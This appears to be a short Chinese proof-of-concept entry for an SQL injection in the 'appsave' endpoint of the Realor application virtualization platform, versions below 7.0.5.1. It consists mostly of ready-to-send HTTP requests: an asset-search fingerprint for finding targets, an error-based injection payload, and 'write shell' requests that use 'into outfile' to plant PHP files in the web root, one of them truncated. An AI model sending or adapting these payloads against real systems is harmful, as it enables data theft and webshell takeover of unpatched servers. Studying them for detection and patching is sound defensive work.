# 瑞友天翼应用虚拟化系统appsave存在SQL注入漏洞

- **系统**：瑞友天翼应用虚拟化系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="REALOR 瑞友天翼虚拟化平台"`
- **请求**：`GET /index.php?s=/Admin/appsave&appid=3%27%29+AND+%28SELECT+2590+FROM%28SELECT+COUNT%28%2A%29%2CCONCAT%280x716a766a71%2C%28SELECT+%28ELT%282590%3D2590%2C1%29%29%29%2C0x7162786271%2CFLOOR%28RAND%280%29%2A2%29%29x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x%29a%29--+ITBH HTTP/1.1`

**请求体 / payload**
```
查看版本
/RapAgent.xgi?CMD=GetRegInfo
Host:
Cookie: think_language=zh-CN; PHPSESSID=qlg6b8j8gnd7lbu535e1h3rd02
/index.php?s=/Admin/appsave&appid=3

\[ruiyou\_appsave\_sqli.yaml]\(公众号：渗透安全HackTwo>\
写shell
GET /index.php?s=/Admin/appsave&appid=3%27%29%3Bselect+unhex%28%273c3f70687020706870696e666f28293b3f3e%27%29+into+outfile+%27.%5C%5C..%5C%5C..%5C%5CWebRoot%5C%5Cpoc2.php%27%23 HTTP/1.1
Host:
Cookie: think_language=zh-CN; PHPSESSID=qlg6b8j8gnd7lbu535e1h3rd02

GET /index.php?s=/Admin/appsave&appid=3%27%29%3Bselect+unhex%28%273c3f70687020636c617373204736736148764732207b207075626c69632066756e6374696…（脚本共 964 字，完整版见原文）
```

**其他**
- 瑞友天翼应用虚拟化系统appsave存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * version < 7.0.5.1